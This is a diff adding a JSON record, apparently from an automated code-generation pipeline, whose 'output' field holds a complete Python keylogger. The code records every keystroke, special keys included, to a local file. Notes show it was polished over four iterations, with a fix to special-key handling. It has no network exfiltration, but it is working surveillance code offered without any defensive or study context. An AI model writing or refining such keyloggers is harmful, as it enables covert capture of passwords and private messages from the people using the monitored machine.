@@ -1,0 +1,8 @@
+{
+  "output": "import keyboard\ndef log_keystrokes():\n    with open(\"keylogs.txt\", \"a\") as log_file:\n        while True:\n            try:\n                event = keyboard.read_event()\n                if event.event_type == keyboard.KEY_DOWN:\n                    key = event.name\n                    if len(key) == 1 and key.isalnum():\n                        log_file.write(key)\n                    else:\n                        special_keys = {\n                            \"enter\": \"[ENTER]\",\n                            \"shift\": \"[SHIFT]\",\n                            \"backspace\": \"[BACKSPACE]\",\n                            \"ctrl\": \"[CTRL]\",\n                            \"alt\": \"[ALT]\",\n                            \"tab\": \"[TAB]\",\n                            \"esc\": \"[ESC]\",\n                            \"delete\": \"[DELETE]\",\n                            \"insert\": \"[INSERT]\",\n                            \"home\": \"[HOME]\",\n                            \"end\": \"[END]\",\n                            \"pageup\": \"[PAGEUP]\",\n                            \"pagedown\": \"[PAGEDOWN]\",\n                            \"up\": \"[UP]\",\n                            \"down\": \"[DOWN]\",\n                            \"left\": \"[LEFT]\",\n                            \"right\": \"[RIGHT]\"\n                        }\n                        log_file.write(special_keys.get(key, f\"[{key.upper()}]\"))\n                    print(event.name)\n            except Exception as e:\n                print(f\"Error: {e}\")\nif __name__ == \"__main__\":\n    log_keystrokes()",
+  "notes": "fixed special keys alignment",
+  "applied_fixes": [
+    "iteration3_issue1"
+  ],
+  "iterations": 4
+}
